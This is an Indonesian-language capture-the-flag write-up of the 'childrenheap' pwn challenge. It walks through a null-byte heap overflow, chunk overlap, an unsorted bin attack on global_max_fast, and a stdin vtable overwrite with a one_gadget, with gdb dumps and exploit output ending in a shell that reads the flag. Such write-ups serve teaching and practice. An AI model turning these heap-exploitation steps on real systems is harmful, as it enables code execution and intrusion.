# childrenheap


## Analisa


```
$ file childrenheap; checksec childrenheap
childrenheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=f8ec123c71c9fef8d36e537fd4225de55520627b, not stripped
[*] '/home/vagrant/childrenheap/childrenheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Program memiliki proteksi penuh (+ASLR). Selain itu diberikan juga source code, `ld-2.23.so`, dan `libc-2.23.so`. Jika dilihat sekilas pada source codenya, bug terdapat pada fungsi `update`:
```C
void update()
{
	printf("Index: ");
	int idx = read_int();
	if(idx < 0 || idx >= 16) error("Invalid index!");
	else if(!ptrs[idx]) error("Index is not allocated!");
	printf("Content: ");
	ptrs[idx][read(0,ptrs[idx],sizes[idx])] = 0;
}
```


Bug nya sama persis seperti soal penyisihan `babyheap`, namun program menggunakan malloc non-tcache, dan **tidak ada fastbin** seperti terlihat pada fungsi `init`:
```C
void init()
{
	mallopt(M_MXFAST,0);
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
	alarm(30);
}
```


Yang sebenarnya dilakukan oleh `mallopt(M_MXFAST,0)` adalah set `global_max_fast` ke size minimal dari malloc, 0x10. Eksploitasi heap akan sulit tanpa fastbin, karena pada umumnya kita menggunakan fastbin ini untuk melakukan alokasi di atas **\_\_malloc\_hook** dan mengisi hook dengan **one_gadget**.



## Eksploitasi


Dengan bug null-byte overflow, kita dapat melakukan hal yang sama seperti `babyheap`, tanpa embel-embel tcache. Lakukan chunk overlap dan [unsorted bin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/unsorted_bin_attack.c), yang memerlukan sedikit [Heap Fengshui](https://en.wikipedia.org/wiki/Heap_feng_shui); karena double free tidak bisa dilakukan tanpa chunk overlap. Berikut state malloc sebelum chunk victim kita free:
```
gef> tel $rdi-0x10 4
0x000055cc35826000|+0x0000: 0x0000000000000000
0x000055cc35826008|+0x0008: 0x0000000000000101
0x000055cc35826010|+0x0010: 0x003f3f3f3f3f3f3f
0x000055cc35826018|+0x0018: 0x0000000000000000
gef> tel $rdi-0x10+0x100 4
0x000055cc35826100|+0x0000: 0x0000000000000000 -> "fastbin" chunk target utk overlap I
0x000055cc35826108|+0x0008: 0x0000000000000071
0x000055cc35826110|+0x0010: 0x003f3f3f3f3f3f3f
0x000055cc35826118|+0x0018: 0x0000000000000000
gef> tel $rdi-0x10+0x100+0x70 4
0x000055cc35826170|+0x0000: 0x0000000000000000 -> "fastbin" chunk target utk overlap II
0x000055cc35826178|+0x0008: 0x0000000000000071
0x000055cc35826180|+0x0010: 0x003f3f3f3f3f3f3f
0x000055cc35826188|+0x0018: 0x0000000000000000
...
gef> tel 0x000055cc358261e0 4
0x000055cc358261e0|+0x0000: 0x00000000000001e0 -> victim chunk, updated, fake prev size
0x000055cc358261e8|+0x0008: 0x0000000000000100 -> overflow, PREV_IN_USE bit 0
0x000055cc358261f0|+0x0010: 0x003f3f3f3f3f3f3f
0x000055cc358261f8|+0x0018: 0x0000000000000000
```


Untuk prev size palsu bisa kita kalkulasikan dari jumlah penambahan ukuran chunk yang akan kita satukan (sama seperti babyheap), dalam kasus ini `0x100+0x70+0x70 = 0x1e0`. Berikut state malloc setelah disatukan:
```
gef> tel 0x55cc35826000 4
0x000055cc35826000|+0x0000: 0x0000000000000000 -> chunk pertama, telah disatukan
0x000055cc35826008|+0x0008: 0x00000000000002e1
0x000055cc35826010|+0x0010: 0x00007f7302e0fb78 -> 0x000055cc358263c0
0x000055cc35826018|+0x0018: 0x00007f7302e0fb78 -> 0x000055cc358263c0
gef> tel 0x55cc35826000+0x100 4
0x000055cc35826100|+0x0000: 0x0000000000000100 -> chunk target I
0x000055cc35826108|+0x0008: 0x0000000000000070
0x000055cc35826110|+0x0010: 0x003f3f3f3f3f3f3f
0x000055cc35826118|+0x0018: 0x0000000000000000
gef> tel 0x55cc35826000+0x100+0x70 4
0x000055cc35826170|+0x0000: 0x0000000000000000 -> chunk target II
0x000055cc35826178|+0x0008: 0x0000000000000071
0x000055cc35826180|+0x0010: "????????"
0x000055cc35826188|+0x0018: 0x0000000000000000
```


Chunk target telah berhasil disatukan, meskipun kita masih menggunakannya. Agar mendapatkan leak libc, kita perlu mengalokasikan chunk berukuran 0xf0, agar last remainder berada tepat di atas chunk target:
```
gef> tel $rax-0x10+0x100 4
0x000055cc35826100|+0x0000: 0x0000000000000100 -> chunk target I, last remainder
0x000055cc35826108|+0x0008: 0x00000000000001e1
0x000055cc35826110|+0x0010: 0x00007f7302e0fb78 -> 0x000055cc358263c0 -> 0x0000000000000000
0x000055cc35826118|+0x0018: 0x00007f7302e0fb78 -> 0x000055cc358263c0 -> 0x0000000000000000
```


Setelah melakukan leak, kita alokasikan semua chunk yang telah disatukan dan lakukan delete terhadap salah satu chunk target. Kemudian ketika chunk sudah di-free, update melalui index berbeda agar kita dapat melakukan unsorted bin attack; state chunk setelah pointer bk teroverwrite:
```
gef> tel 0x55cc35826100 4
0x000055cc35826100|+0x0000: 0x0000000000000100
0x000055cc35826108|+0x0008: 0x0000000000000071
0x000055cc35826110|+0x0010: 0x0000000000000000
0x000055cc35826118|+0x0018: 0x00007f7302e117e8 -> global_max_fast-0x10
...
gef> tel &global_max_fast 1
0x00007f7302e117f8|+0x0000: 0x00007f7302e0fb78 -> 0x000055cc358263c0
```


Sekarang kita dapat melakukan fastbin attack tanpa limitasi size. Kita tetap akan menggunakan chunk berukuran 0x60 untuk melakukan alokasi di area libc. Saya sendiri sudah mencoba mengalokasikan chunk di atas **\_\_malloc\_hook**, namun **one\_gadget** crash. Alternatif lainnya adalah dengan mengalokasikan chunk tepat di atas vtable; karena ini libc 2.23 maka memungkinkan untuk melakukan vtable overwrite dan mengisinya dengan **one\_gadget**:
```
gef> tel $2+0x90 10
0x00007f7302e0f970|+0x0000: 0xffffffffffffffff
0x00007f7302e0f978|+0x0008: 0x0000000000000000
0x00007f7302e0f980|+0x0010: 0x00007f7302e0f9c0 -> target, stdin->_wide_data
0x00007f7302e0f988|+0x0018: 0x0000000000000000
0x00007f7302e0f990|+0x0020: 0x0000000000000000
0x00007f7302e0f998|+0x0028: 0x0000000000000000
0x00007f7302e0f9a0|+0x0030: 0x00000000ffffffff
0x00007f7302e0f9a8|+0x0038: 0x0000000000000000
0x00007f7302e0f9b0|+0x0040: 0x0000000000000000
0x00007f7302e0f9b8|+0x0048: 0x00007f7302e0e6e0 -> stdin->vtable
gef> tel $2+0x90+0xd 4
0x00007f7302e0f97d|+0x0000: 0x7302e0f9c0000000 -> fastbin chunk, valid
0x00007f7302e0f985|+0x0008: 0x000000000000007f
0x00007f7302e0f98d|+0x0010: 0x0000000000000000
0x00007f7302e0f995|+0x0018: 0x0000000000000000
```


`stdin` diambil sebagai target karena `fgets(buf,0x10,stdin)` pada fungsi `read_int` menggunakan vtable secara internal. Kita memerlukan area writable; heap cocok untuk ini. Sebelum melakukan attack, kita menggunakan fungsi `show` sekali lagi agar mendapatkan leak heap. Target sudah didapatkan, saatnya eksekusi:
```
gef> tel 0x55cc358261e0
0x000055cc358261e0|+0x0000: 0x00000000000001e0 -> chunk keempat
0x000055cc358261e8|+0x0008: 0x0000000000000101
heap leak <- 0x000055cc358261f0|+0x0010: 0x00007f7302b3b2a4
0x000055cc358261f8|+0x0018: 0x00007f7302b3b2a4 -> execve("/bin/sh",[rsp+0x50],envp)
```


Setelah overwrite fd chunk dan melakukan malloc:
```
gef> tel $rax-0x10
0x00007f7302e0f97d|+0x0000: 0x7302e0f9c0000000
0x00007f7302e0f985|+0x0008: 0x000000000000007f
0x00007f7302e0f98d|+0x0010: 0x0000000000000000  <- $rax, return malloc
gef> p _IO_2_1_stdin_
$16 = {
  file = {
    _flags = 0xfbad208b, 
    ...
    _wide_data = 0x7f7302e0f9c0 <_IO_wide_data_0>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x55cc358261f0
}
```


Output script:
```
$ python exploit.py go
[*] '/home/tempest/projects/cscctf/2019/final/pwn/childrenheap/childrenheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[+] Opening connection to childrenheap.problem.cscctf.com on port 10002: Done
[*] libc leak: 0x7ff91dfd6b78
[*] libc base: 0x7ff91dc12000
[*] _IO_2_1_stdin_: 0x7ff91dfd68e0
[*] fake vtable: 0x55781681e1f0
[*] Switching to interactive mode
Children Heap
=============
1. Allocate
2. Update
3. Show
4. Free
5. Exit
>> $ cat /home/childrenheap/flag
CCC{W0W_y0u_ar3_pr0f1ciEnT_in_H3Ap}
$ 
[*] Closed connection to 128.199.101.63 port 11115
```